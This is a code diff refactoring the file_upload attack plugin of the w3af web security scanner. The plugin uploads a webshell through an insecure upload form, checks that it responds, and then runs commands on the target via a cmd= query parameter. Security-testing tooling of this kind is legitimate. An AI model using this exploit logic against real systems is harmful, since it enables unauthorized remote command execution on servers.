@@ -23,23 +23,14 @@ import os.path
 import tempfile
 
 import core.controllers.output_manager as om
+import plugins.attack.payloads.shell_handler as shell_handler
 
-# options
-from core.data.options.opt_factory import opt_factory
-from core.data.options.option_list import OptionList
+from core.data.kb.exec_shell import exec_shell as exec_shell
+from core.controllers.exceptions import w3afException
+from core.controllers.misc.temp_dir import get_temp_dir
 from core.controllers.plugins.attack_plugin import AttackPlugin
 
-import core.data.kb.knowledge_base as kb
-import core.data.kb.vuln as vuln
-from core.data.kb.exec_shell import exec_shell as exec_shell
-from core.data.parsers.url import parse_qs
-
-from core.controllers.exceptions import w3afException
-import plugins.attack.payloads.shell_handler as shell_handler
 from plugins.attack.payloads.decorators.exec_decorator import exec_debug
-
-
-from core.controllers.misc.temp_dir import get_temp_dir
 
 
 class file_upload(AttackPlugin):
@@ -50,10 +41,6 @@ class file_upload(AttackPlugin):
 
     def __init__(self):
         AttackPlugin.__init__(self)
-
-        # Internal variables
-        self._path_name = ''
-        self._file_name = ''
 
     def get_attack_type(self):
         '''
@@ -104,15 +91,15 @@ class file_upload(AttackPlugin):
 
         # Create a file that will be uploaded
         extension = url.get_extension()
-        fname = self._create_file(extension)
-        file_handler = open(fname, "r")
+        path, file_name = self._create_file(extension)
+        file_handler = open(os.path.join(path, file_name), "r")
 
         #   If there are files,
-        if 'fileVars' in vuln_obj:
+        if 'file_vars' in vuln_obj:
             #
             #   Upload the file
             #
-            for file_var_name in vuln_obj['fileVars']:
+            for file_var_name in vuln_obj['file_vars']:
                 # the [0] was added here to support repeated parameter names
                 exploit_dc[file_var_name][0] = file_handler
             http_method = getattr(self._uri_opener, method)
@@ -120,19 +107,19 @@ class file_upload(AttackPlugin):
 
             # Call the uploaded script with an empty value in cmd parameter
             # this will return the shell_handler.SHELL_IDENTIFIER if success
-            dst = vuln_obj['fileDest']
-            self._exploit = dst.get_domain_path().url_join(self._file_name)
+            dst = vuln_obj['file_dest']
+            self._exploit = dst.get_domain_path().url_join(file_name)
             self._exploit.querystring = u'cmd='
             response = self._uri_opener.GET(self._exploit)
 
             # Clean-up
             file_handler.close()
-            os.remove(self._path_name)
+            os.remove(os.path.join(path, file_name))
 
             if shell_handler.SHELL_IDENTIFIER in response.get_body():
                 return True
 
-        #   If we got here, there is nothing positive to report ;)
+        #   If we got here, there is nothing positive to report
         return False
 
     def _create_file(self, extension):
@@ -142,23 +129,24 @@ class file_upload(AttackPlugin):
         @return: Name of the file that was created.
         '''
         # Get content
-        file_content, real_extension = shell_handler.get_webshells(
-            extension, force_extension=True)[0]
+        file_content, real_extension = shell_handler.get_webshells(extension,
+                                                                   force_extension=True)[0]
         if extension == '':
             extension = real_extension
 
         # Open target
         temp_dir = get_temp_dir()
-        low_level_fd, self._path_name = tempfile.mkstemp(
-            prefix='w3af_', suffix='.' + extension, dir=temp_dir)
+        low_level_fd, path_name = tempfile.mkstemp(prefix='w3af_',
+                                                   suffix='.' + extension,
+                                                   dir=temp_dir)
         file_handler = os.fdopen(low_level_fd, "w+b")
 
         # Write content to target
         file_handler.write(file_content)
         file_handler.close()
 
-        _path, self._file_name = os.path.split(self._path_name)
-        return self._path_name
+        path, file_name = os.path.split(path_name)
+        return path, file_name
 
     def get_root_probability(self):
         '''
@@ -177,8 +165,8 @@ class file_upload(AttackPlugin):
         '''
         return '''
         This plugin exploits insecure file uploads and returns a shell. It's
-        rather simple, using a form the plugin uploads the corresponding
-        webshell ( php, asp, etc. ) verifies that the shell is working, and if
+        rather simple, using an html form the plugin uploads the corresponding
+        webshell (php, asp, etc.) verifies that the shell is working, and if
         everything is working as expected the user can start typing commands.
 
         No configurable parameters exist.
@@ -207,7 +195,7 @@ class FileUploadShell(exec_shell):
         to_send = self.get_exploit_URL()
         to_send.querystring = u'cmd=' + command
         response = self._uri_opener.GET(to_send)
-        return response.get_body()
+        return shell_handler.extract_result(response.get_body())
 
     def end(self):
         msg = 'File upload shell is going to delete the webshell that was'\
